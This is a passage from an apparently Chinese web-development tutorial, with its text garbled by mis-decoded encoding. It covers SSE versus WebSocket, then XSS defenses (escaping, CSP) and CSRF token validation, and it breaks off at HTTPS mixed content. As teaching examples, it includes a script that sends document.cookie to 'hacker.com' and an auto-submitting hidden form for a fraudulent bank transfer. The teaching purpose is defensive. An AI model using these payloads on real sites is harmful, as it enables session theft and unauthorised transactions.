align="left">å†…ç½®æ–­çº¿é‡è¿æœºåˆ¶ï¼ˆå®¢æˆ·ç«¯è‡ªåŠ¨æ¢å¤è¿æ¥ï¼‰</td></tr><tr><td align="left">è½»é‡çº§åè®®</td><td align="left">æ•°æ®æ ¼å¼ç®€å•ï¼ˆçº¯æ–‡æœ¬æµï¼‰ï¼Œåè®®å¼€é”€å°</td></tr><tr><td align="left">æµè§ˆå™¨åŸç”Ÿæ”¯æŒ</td><td align="left">é€šè¿‡ EventSource API å®ç°ï¼ˆIE é™¤å¤–ï¼‰</td></tr></tbody></table><p><strong>æŠ€æœ¯é€‰å‹å¯¹æ¯”</strong></p><table><thead><tr><th align="left">åœºæ™¯éœ€æ±‚</th><th align="left">SSE</th><th align="left">WebSocket</th><th align="left">HTTP è½®è¯¢</th></tr></thead><tbody><tr><td align="left">æœåŠ¡å™¨â†’å®¢æˆ·ç«¯å•å‘æ¨é€</td><td align="left">âœ”ï¸ æœ€ä½³</td><td align="left">âš ï¸ è¿‡åº¦è®¾è®¡</td><td align="left">âŒ é«˜å»¶è¿Ÿ</td></tr><tr><td align="left">åŒå‘äº¤äº’</td><td align="left">âŒ ä¸æ”¯æŒ</td><td align="left">âœ”ï¸ åŸç”Ÿæ”¯æŒ</td><td align="left">âŒ ä½æ•ˆ</td></tr><tr><td align="left">æµè§ˆå™¨å…¼å®¹æ€§</td><td align="left">âœ”ï¸ é™¤IE</td><td align="left">âœ”ï¸ å¹¿æ³›</td><td align="left">âœ”ï¸ å…¨æ”¯æŒ</td></tr><tr><td align="left">åè®®å¤æ‚åº¦</td><td align="left">â˜…â˜†â˜†</td><td align="left">â˜…â˜…â˜…</td><td align="left">â˜…â˜…â˜†</td></tr><tr><td align="left">éƒ¨ç½²æˆæœ¬</td><td align="left">â˜…â˜†â˜†</td><td align="left">â˜…â˜…â˜†</td><td align="left">â˜…â˜†â˜†</td></tr></tbody></table><p><strong>æœ€ä½³å®è·µ</strong></p><p>ï¼ˆ1ï¼‰å‰ç«¯å®ç°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> es = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSource</span>(<span class="hljs-string">&#x27;/api/stream&#x27;</span>);<br><br><span class="hljs-comment">// ç›‘å¬è‡ªå®šä¹‰äº‹ä»¶</span><br>es.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;stock&#x27;</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;<br>  <span class="hljs-title function_">renderStock</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(e.<span class="hljs-property">data</span>));<br>&#125;);<br><br><span class="hljs-comment">// é”™è¯¯å¤„ç† + è‡ªåŠ¨é‡è¿</span><br>es.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  es.<span class="hljs-title function_">close</span>();<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSource</span>(...), <span class="hljs-number">5000</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æœåŠ¡ç«¯è¦æ±‚</p><ul><li>å“åº”å¤´è®¾ç½®ï¼š</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/event-stream<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br></code></pre></td></tr></table></figure><ul><li>æ•°æ®æ ¼å¼è§„èŒƒï¼š</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Text">event: notification  // äº‹ä»¶ç±»å‹<br>id: 1678901234       // æ¶ˆæ¯IDï¼ˆç”¨äºæ–­çº¿ç»­ä¼ ï¼‰<br>data: &#123;&quot;msg&quot;:&quot;Hello&quot;&#125;// æ•°æ®å†…å®¹ï¼ˆå¯å¤šè¡Œï¼‰<br>retry: 10000         // é‡è¿é—´éš”ï¼ˆæ¯«ç§’ï¼‰<br>\n\n                 // æ¶ˆæ¯ç»“æŸç¬¦ï¼ˆä¸¤ä¸ªæ¢è¡Œï¼‰<br></code></pre></td></tr></table></figure><p><strong>ä¸é€‚ç”¨åœºæ™¯</strong></p><ul><li>éœ€è¦å®¢æˆ·ç«¯é¢‘ç¹ä¸Šä¼ æ•°æ®ï¼ˆå¦‚å®æ—¶æ¸¸æˆï¼‰â†’ é€‰ WebSocket</li><li>äºŒè¿›åˆ¶æ•°æ®ä¼ è¾“ï¼ˆå¦‚è§†é¢‘æµï¼‰â†’ é€‰ WebRTC&#x2F;WebSocket</li><li>IE æµè§ˆå™¨æ”¯æŒ â†’ é™çº§ä¸º HTTP é•¿è½®è¯¢</li></ul><p><strong>ç†æƒ³é€‚ç”¨åœºæ™¯</strong></p><ul><li>åªè¯»æ•°æ®æµ</li><li>ä½é¢‘äº‹ä»¶é€šçŸ¥</li><li>ç®€å•è¿›åº¦æ›´æ–°</li><li>å…¼å®¹æ ‡å‡† HTTP åŸºç¡€è®¾æ–½</li></ul><blockquote><p>åœ¨ 90% çš„æœåŠ¡å™¨æ¨é€åœºæ™¯ä¸­ï¼ŒSSE ç›¸æ¯” WebSocket å¯å‡å°‘ 40% å¼€å‘é‡</p></blockquote><h1 id="ä¸‰ã€ç½‘ç»œå®‰å…¨"><a href="#ä¸‰ã€ç½‘ç»œå®‰å…¨" class="headerlink" title="ä¸‰ã€ç½‘ç»œå®‰å…¨"></a>ä¸‰ã€ç½‘ç»œå®‰å…¨</h1><h2 id="3-1-æ”»å‡»é˜²æŠ¤"><a href="#3-1-æ”»å‡»é˜²æŠ¤" class="headerlink" title="3.1 æ”»å‡»é˜²æŠ¤"></a>3.1 æ”»å‡»é˜²æŠ¤</h2><h3 id="XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰ä¸é˜²å¾¡ï¼ˆå†…å®¹ç¼–ç -CSPï¼‰"><a href="#XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰ä¸é˜²å¾¡ï¼ˆå†…å®¹ç¼–ç -CSPï¼‰" class="headerlink" title="XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰ä¸é˜²å¾¡ï¼ˆå†…å®¹ç¼–ç &#x2F;CSPï¼‰"></a>XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰ä¸é˜²å¾¡ï¼ˆå†…å®¹ç¼–ç &#x2F;CSPï¼‰</h3><p><strong>XSSæ”»å‡»åŸç†ä¸åˆ†ç±»</strong></p><p>å®šä¹‰ï¼šæ”»å‡»è€…å‘ç½‘é¡µæ³¨å…¥æ¶æ„è„šæœ¬ï¼Œå½“ç”¨æˆ·è®¿é—®æ—¶è„šæœ¬åœ¨æµè§ˆå™¨æ‰§è¡Œï¼Œçªƒå–æ•°æ®æˆ–ç¯¡æ”¹é¡µé¢ã€‚</p><p>æ”»å‡»ç±»å‹ï¼š</p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">æ³¨å…¥æ–¹å¼</th><th align="left">æ¡ˆä¾‹åœºæ™¯</th></tr></thead><tbody><tr><td align="left">å­˜å‚¨å‹XSS</td><td align="left">æ¶æ„è„šæœ¬å­˜å…¥æ•°æ®åº“ï¼ˆå¦‚è¯„è®º&#x2F;æ¶ˆæ¯ï¼‰</td><td align="left">ç”¨æˆ·æµè§ˆå«æ”»å‡»è„šæœ¬çš„è®ºå›é¡µé¢</td></tr><tr><td align="left">åå°„å‹XSS</td><td align="left">è„šæœ¬é€šè¿‡URLå‚æ•°æ³¨å…¥å¹¶å³æ—¶è¿”å›</td><td align="left">é’“é±¼é‚®ä»¶è¯±å¯¼ç‚¹å‡»å«æ¶æ„URL</td></tr><tr><td align="left">DOMå‹XSS</td><td align="left">å‰ç«¯JSæ“ä½œDOMæ—¶æ³¨å…¥</td><td align="left">innerHTMLåŠ è½½æœªè¿‡æ»¤æ•°æ®</td></tr></tbody></table><p>å±å®³ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// çªƒå–Cookieçš„æ¶æ„è„šæœ¬</span><br>&lt;script&gt;<br>  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.com/steal?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒé˜²å¾¡æ–¹æ¡ˆ</strong></p><p>(1) å†…å®¹ç¼–ç ï¼ˆè¾“å‡ºè½¬ä¹‰ï¼‰</p><p>åŸåˆ™ï¼šæ‰€æœ‰ä¸å¯ä¿¡æ•°æ®è¾“å‡ºå‰å¿…é¡»è½¬ä¹‰ï¼</p><p>è½¬ä¹‰è§„åˆ™ï¼š</p><table><thead><tr><th align="left">è¾“å‡ºä½ç½®</th><th align="left">è½¬ä¹‰æ–¹æ³•</th><th align="left">ä»£ç ç¤ºä¾‹ï¼ˆJavaScriptï¼‰</th></tr></thead><tbody><tr><td align="left">HTMLæ­£æ–‡</td><td align="left">è½¬ä¹‰ &lt; &gt; &amp; â€˜ â€œ</td><td align="left">const safeStr &#x3D; str.replace(&#x2F;[&amp;&lt;&gt;â€â€˜]&#x2F;g, m &#x3D;&gt; &amp;${htmlEscapes[m]};)</td></tr><tr><td align="left">HTMLå±æ€§</td><td align="left">è½¬ä¹‰ â€œ â€˜ å¹¶åŒ…è£¹åœ¨å¼•å·ä¸­</td><td align="left"><code>&lt;div data-value=&quot;$&#123;escapeAttr(value)&#125;&quot;&gt;</code></td></tr><tr><td align="left">JavaScript</td><td align="left">è½¬ä¹‰ \ â€˜ â€œ &lt; &gt; &amp; + Unicodeç¼–ç </td><td align="left">const jsSafe &#x3D; JSON.stringify(untrustedData);</td></tr><tr><td align="left">URLå‚æ•°</td><td align="left">ä½¿ç”¨encodeURIComponent()</td><td align="left">href&#x3D;â€&#x2F;search?q&#x3D;${encodeURIComponent(input)}â€</td></tr></tbody></table><p>ç°ä»£æ¡†æ¶è‡ªå®šä¹‰è½¬ä¹‰ï¼š</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JSX"><span class="hljs-comment">// Reactè‡ªåŠ¨è½¬ä¹‰</span><br>&lt;div&gt;&#123;userInput&#125;&lt;/div&gt;<br><br><span class="hljs-comment">// Vueè‡ªåŠ¨è½¬ä¹‰</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>&#123;&#123; userInput &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>(2) å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰</p><p>åŸç†ï¼šé€šè¿‡HTTPå¤´å®šä¹‰å¯ä¿¡èµ„æºç™½åå•ï¼Œé˜»æ­¢éæ³•è„šæœ¬æ‰§è¡Œã€‚</p><p>å…³é”®æŒ‡ä»¤ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span><br>  default-src &#x27;self&#x27;;       // é»˜è®¤ä»…å…è®¸åŒæº<br>  script-src &#x27;self&#x27; https://trusted.cdn.com;  // è„šæœ¬æ¥æº<br>  style-src &#x27;self&#x27; &#x27;nonce-abc123&#x27;;  // æ ·å¼æ¥æº<br>  img-src *;                // å›¾ç‰‡å…è®¸ä»»æ„æº<br>  connect-src https://api.example.com;  // é™åˆ¶AJAXè¯·æ±‚<br>  frame-ancestors &#x27;none&#x27;;   // ç¦æ­¢åµŒå¥—<br>  report-uri /csp-report;   // è¿è§„ä¸ŠæŠ¥<br></code></pre></td></tr></table></figure><p>å®‰å…¨å¢å¼ºç­–ç•¥ï¼š</p><table><thead><tr><th align="left">ç­–ç•¥</th><th align="left">ä½œç”¨</th><th align="left">ç¤ºä¾‹æŒ‡ä»¤</th></tr></thead><tbody><tr><td align="left">Nonceæœºåˆ¶</td><td align="left">ä»…å…è®¸å¸¦ç‰¹å®šéšæœºæ•°çš„è„šæœ¬æ‰§è¡Œ</td><td align="left">script-src â€˜nonce-abc123â€™</td></tr><tr><td align="left">Hashç™½åå•</td><td align="left">ä»…å…è®¸åŒ¹é…å“ˆå¸Œå€¼çš„è„šæœ¬</td><td align="left">script-src â€˜sha256-xxxxxâ€™</td></tr><tr><td align="left">ä¸¥æ ¼åŠ¨æ€</td><td align="left">ç¦æ­¢åŠ¨æ€åˆ›å»ºè„šæœ¬ï¼ˆeval()&#x2F;setTimeoutï¼‰</td><td align="left">â€˜strict-dynamicâ€™</td></tr></tbody></table><p><strong>é˜²å¾¡ä½“ç³»åˆ†å±‚è®¾è®¡</strong></p><table><thead><tr><th align="left">å±‚çº§</th><th align="left">é˜²å¾¡æªæ–½</th><th align="left">æœ‰æ•ˆæ€§</th></tr></thead><tbody><tr><td align="left">è¾“å…¥å±‚</td><td align="left">è¾“å…¥éªŒè¯ + è¿‡æ»¤</td><td align="left">â˜…â˜…â˜†</td></tr><tr><td align="left">è¾“å‡ºå±‚</td><td align="left">å†…å®¹ç¼–ç ï¼ˆæ ¸å¿ƒé˜²çº¿ï¼‰</td><td align="left">â˜…â˜…â˜…</td></tr><tr><td align="left">ä¼ è¾“å±‚</td><td align="left">HTTPSé˜²æ­¢çªƒå¬</td><td align="left">â˜…â˜…â˜†</td></tr><tr><td align="left">åè®®å±‚</td><td align="left">CSPï¼ˆç»ˆæé˜²æŠ¤ï¼‰</td><td align="left">â˜…â˜…â˜…</td></tr><tr><td align="left">åç½®é˜²æŠ¤</td><td align="left">Cookieè®¾ç½®HttpOnly</td><td align="left">â˜…â˜…â˜†</td></tr></tbody></table><p><strong>å®æˆ˜ä»£ç ç¤ºä¾‹</strong></p><p>(1) HTML ä»£ç è½¬ä¹‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHTML</span>(<span class="hljs-params">str</span>) &#123;<br>  <span class="hljs-keyword">const</span> map = &#123; <br>    <span class="hljs-string">&#x27;&amp;&#x27;</span>: <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>, <br>    <span class="hljs-string">&#x27;&lt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>, <br>    <span class="hljs-string">&#x27;&gt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>,<br>    <span class="hljs-string">&#x27;&quot;&#x27;</span>: <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>, <br>    <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&#x27;&amp;#39;&#x27;</span> <br>  &#125;;<br>  <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[&amp;&lt;&gt;&quot;&#x27;]/g</span>, <span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> map[m]);<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) CSP é…ç½®ï¼ˆNginxï¼‰</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">add_header</span> Content-Security-Policy <span class="hljs-string">&quot;default-src &#x27;self&#x27;; </span><br><span class="hljs-string">  script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; https:; </span><br><span class="hljs-string">  img-src * data:; </span><br><span class="hljs-string">  style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; </span><br><span class="hljs-string">  frame-ancestors &#x27;none&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ä¸TokenéªŒè¯"><a href="#CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ä¸TokenéªŒè¯" class="headerlink" title="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ä¸TokenéªŒè¯"></a>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ä¸TokenéªŒè¯</h3><p><strong>CSRF æ”»å‡»åŸç†</strong></p><p>å®šä¹‰ï¼šæ”»å‡»è€…è¯±å¯¼ç”¨æˆ·åœ¨å·²ç™»å½•çŠ¶æ€ä¸‹è®¿é—®æ¶æ„é¡µé¢ï¼Œè¯¥é¡µé¢ä¼ªé€ åˆæ³•è¯·æ±‚ï¼ˆå¦‚è½¬è´¦&#x2F;æ”¹å¯†ï¼‰ï¼Œåˆ©ç”¨æµè§ˆå™¨çš„è‡ªåŠ¨Cookieå‘é€æœºåˆ¶å®Œæˆéæˆæƒæ“ä½œã€‚</p><p>æ”»å‡»æµç¨‹ï¼š</p><pre class="mermaid">sequenceDiagram    participant ç”¨æˆ·    participant é“¶è¡Œç½‘ç«™    participant æ¶æ„ç½‘ç«™    ç”¨æˆ·->>é“¶è¡Œç½‘ç«™: æ­£å¸¸ç™»å½•ï¼ˆè·å¾—Session Cookieï¼‰    ç”¨æˆ·->>æ¶æ„ç½‘ç«™: è®¿é—®é’“é±¼é¡µé¢    æ¶æ„ç½‘ç«™->>é“¶è¡Œç½‘ç«™: è‡ªåŠ¨å‘é€ä¼ªé€ è¯·æ±‚ï¼ˆæºå¸¦ç”¨æˆ·Cookieï¼‰    é“¶è¡Œç½‘ç«™->>æ¶æ„ç½‘ç«™: æ‰§è¡Œæ“ä½œï¼ˆè¯¯è®¤ç”¨æˆ·èº«ä»½ï¼‰</pre><p>æ”»å‡»æ¡ä»¶ï¼š</p><ol><li>ç”¨æˆ·å·²ç™»å½•ç›®æ ‡ç½‘ç«™</li><li>ç½‘ç«™ä¾èµ–CookieéªŒè¯èº«ä»½</li><li>ç”¨æˆ·ä¸»åŠ¨è®¿é—®æ¶æ„é¡µé¢ï¼ˆå«è‡ªåŠ¨æäº¤è¡¨å•&#x2F;è„šæœ¬ï¼‰</li></ol><p>ä¼ªé€ è¯·æ±‚ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- é’“é±¼é¡µé¢éšè—è¡¨å• --&gt;<br>&lt;body onload=&quot;document.forms[0].submit()&quot;&gt;<br>  &lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt;<br>    &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot;&gt;<br>    &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;hacker_account&quot;&gt;<br>  &lt;/form&gt;<br>&lt;/body&gt;<br></code></pre></td></tr></table></figure><p><strong>TokenéªŒè¯é˜²å¾¡æœºåˆ¶</strong></p><p>æ ¸å¿ƒåŸç†ï¼šåœ¨è¯·æ±‚ä¸­åµŒå…¥æœåŠ¡ç«¯ç”Ÿæˆçš„éšæœºTokenï¼ŒéªŒè¯è¯·æ±‚æ˜¯å¦æ¥è‡ªçœŸå®é¡µé¢ï¼ˆæ¶æ„ç½‘ç«™æ— æ³•è·å–Tokenï¼‰ã€‚</p><p>token å®ç°æµç¨‹ï¼š</p><pre class="mermaid">sequenceDiagram    participant ç”¨æˆ·    participant å‰ç«¯    participant åç«¯    ç”¨æˆ·->>å‰ç«¯: è®¿é—®é¡µé¢    å‰ç«¯->>åç«¯: è¯·æ±‚é¡µé¢    åç«¯-->>å‰ç«¯: è¿”å›HTML + CSRF Tokenï¼ˆå­˜å…¥Sessionï¼‰    å‰ç«¯->>åç«¯: æäº¤è¡¨å•ï¼ˆæºå¸¦Tokenï¼‰    åç«¯->>åç«¯: éªŒè¯TokenåŒ¹é… -> æ‰§è¡Œæ“ä½œ</pre><p>token ç”Ÿæˆä¸å­˜å‚¨ï¼š</p><table><thead><tr><th align="left">ä½ç½®</th><th align="left">ç”Ÿæˆæ–¹å¼</th><th align="left">å­˜å‚¨ä½ç½®</th></tr></thead><tbody><tr><td align="left">æœåŠ¡ç«¯</td><td align="left">åŠ å¯†éšæœºå­—ç¬¦ä¸²ï¼ˆå¦‚crypto.randomBytes(32)ï¼‰</td><td align="left">Session&#x2F;Redis</td></tr><tr><td align="left">å‰ç«¯</td><td align="left">æ’å…¥è¡¨å•&#x2F;è¯·æ±‚å¤´</td><td align="left">è¡¨å•éšè—åŸŸ&#x2F;HTTPå¤´</td></tr></tbody></table><p>å‰ç«¯é›†æˆç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- è¡¨å•å†…åµŒToken --&gt;<br>&lt;form action=&quot;/transfer&quot; method=&quot;POST&quot;&gt;<br>  &lt;input type=&quot;hidden&quot; name=&quot;_csrf&quot; value=&quot;token_value&quot;&gt; <br>  &lt;!-- å…¶ä»–å­—æ®µ --&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;!-- <span class="hljs-variable constant_">AJAX</span>è¯·æ±‚æºå¸¦<span class="hljs-title class_">Token</span> --&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/action&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&#x27;X-CSRF-Token&#x27;</span>: <span class="hljs-string">&#x27;token_value&#x27;</span>  <span class="hljs-comment">// è‡ªå®šä¹‰è¯·æ±‚å¤´</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>æœåŠ¡ç«¯éªŒè¯é€»è¾‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyCsrfToken</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">const</span> clientToken = req.<span class="hljs-property">body</span>.<span class="hljs-property">_csrf</span> || req.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;x-csrf-token&#x27;</span>];<br>  <span class="hljs-keyword">const</span> serverToken = req.<span class="hljs-property">session</span>.<span class="hljs-property">csrfToken</span>; <span class="hljs-comment">// ä»Sessionè¯»å–</span><br>  <br>  <span class="hljs-keyword">if</span> (!clientToken || clientToken !== serverToken) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;CSRF TokenéªŒè¯å¤±è´¥&#x27;</span>);<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é˜²å¾¡ä½“ç³»åˆ†å±‚åŠ å›º</strong></p><table><thead><tr><th align="left">é˜²å¾¡å±‚</th><th align="left">æªæ–½</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left">TokenéªŒè¯</td><td align="left">åŒæ­¥å™¨Tokenæ¨¡å¼</td><td align="left">æ ¸å¿ƒé˜²å¾¡ï¼ˆé˜»æ–­ä¼ªé€ è¯·æ±‚ï¼‰</td></tr><tr><td align="left">Cookieç­–ç•¥</td><td align="left">SameSite&#x3D;Strict&#x2F;Lax</td><td align="left">é˜»æ­¢ç¬¬ä¸‰æ–¹å‘é€Cookie</td></tr><tr><td align="left">æ“ä½œéªŒè¯</td><td align="left">æ•æ„Ÿæ“ä½œéœ€äºŒæ¬¡ç¡®è®¤ï¼ˆå¯†ç &#x2F;OTPï¼‰</td><td align="left">å¢åŠ æ”»å‡»é—¨æ§›</td></tr><tr><td align="left">Refereræ£€æŸ¥</td><td align="left">éªŒè¯è¯·æ±‚æ¥æºåŸŸå</td><td align="left">è¾…åŠ©é˜²å¾¡ï¼ˆå¯è¢«ç»•è¿‡ï¼‰</td></tr></tbody></table><p>SameSite Cookie ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç™»å½•å“åº”è®¾ç½®Cookie</span><br>res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;sessionID&#x27;</span>, <span class="hljs-string">&#x27;abc123&#x27;</span>, &#123;<br>  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">&#x27;strict&#x27;</span>,  <span class="hljs-comment">// å®Œå…¨ç¦æ­¢ç¬¬ä¸‰æ–¹å‘é€</span><br>  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>         <span class="hljs-comment">// ä»…HTTPSä¼ è¾“</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Token è®¾è®¡æœ€ä½³å®è·µ</strong></p><ul><li>å•æ¬¡æœ‰æ•ˆæ€§ï¼šæ¯æ¬¡æäº¤ååˆ·æ–°Tokenï¼ˆé˜²é‡æ”¾æ”»å‡»ï¼‰</li><li>ç»‘å®šç”¨æˆ·ï¼šTokenå…³è”ç”¨æˆ·IDï¼ˆé˜²ä¸åŒç”¨æˆ·é—´å¤ç”¨ï¼‰</li><li>çŸ­æ—¶æ•ˆæ€§ï¼šè®¾ç½®Tokenæœ‰æ•ˆæœŸï¼ˆå¦‚10åˆ†é’Ÿï¼‰</li><li>åŒé‡éªŒè¯ï¼šå…³é”®æ“ä½œç»„åˆToken + ç”Ÿç‰©è®¤è¯</li></ul><p><strong>æ”»å‡»åœºæ™¯å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">CSRF</th><th align="left">XSS</th></tr></thead><tbody><tr><td align="left">æ”»å‡»ç›®æ ‡</td><td align="left">åˆ©ç”¨ç”¨æˆ·èº«ä»½æ‰§è¡Œæ“ä½œ</td><td align="left">çªƒå–ç”¨æˆ·æ•°æ®</td></tr><tr><td align="left">ä¾èµ–æ¡ä»¶</td><td align="left">ç”¨æˆ·ç™»å½•çŠ¶æ€ + è®¿é—®æ¶æ„é¡µé¢</td><td align="left">ç½‘ç«™å­˜åœ¨æ³¨å…¥æ¼æ´</td></tr><tr><td align="left">é˜²å¾¡æ ¸å¿ƒ</td><td align="left">TokenéªŒè¯ + SameSite Cookie</td><td align="left">è¾“å…¥è¾“å‡ºè¿‡æ»¤ + CSP</td></tr></tbody></table><h3 id="HTTPSæ··åˆå†…å®¹é£é™©ä¸HSTSç­–ç•¥"><a href="#HTTPSæ··åˆå†…å®¹é£é™©ä¸HSTSç­–ç•¥" class="headerlink" title="HTTPSæ··åˆå†…å®¹é£é™©ä¸HSTSç­–ç•¥"></a>HTTPSæ··åˆå†…å®¹é£é™©ä¸HSTSç­–ç•¥</h3><p><strong>æ··åˆå†…å®¹é£é™©</strong></p><p>å®šä¹‰ï¼šHTTPSé¡µé¢ä¸­åŠ è½½äº†é€šè¿‡HTTPåè®®ä¼ è¾“çš„å­èµ„æºï¼ˆå¦‚å›¾ç‰‡&#x2F;è„šæœ¬&#x2F;æ ·å¼ï¼‰ï¼Œå¯¼è‡´é¡µé¢å®‰å…¨ç­‰çº§è¢«ç ´åã€‚</p><p>æ”»å‡»åŸç†ï¼š</p><pre 